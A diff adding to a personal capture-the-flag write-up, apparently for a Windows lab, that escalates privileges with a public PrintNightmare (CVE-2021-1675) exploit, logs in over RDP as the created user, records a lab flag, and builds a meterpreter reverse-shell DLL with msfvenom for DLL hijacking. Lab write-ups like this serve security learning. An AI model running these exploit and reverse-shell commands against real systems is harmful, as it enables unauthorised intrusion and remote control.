@@ -159,3 +159,35 @@ So it might be vulnerable to print night mare vulnerability.
 
 ![[Pasted image 20240904021616.png]]
 
+Mine CVE didn't worked let's try different one
+https://github.com/calebstewart/CVE-2021-1675
+
+```
+Import-Module .\CVE-2021-1675.ps1
+```
+
+```
+Invoke-Nightmare -NewUser "Sardarji" -NewPassword "Password123!"
+```
+
+![[Pasted image 20240904023402.png]]
+
+And guess what it worked
+```
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.11.35 /u:'Sardarji' /p:'Password123!'
+```
+
+![[Pasted image 20240904024007.png]]
+
+Root access
+```
+HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}
+```
+
+
+Another method is Dll hijacking.
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.51.9.13 LPORT=4444 -f dll -o kavremoverENU.dll
+```
+
+
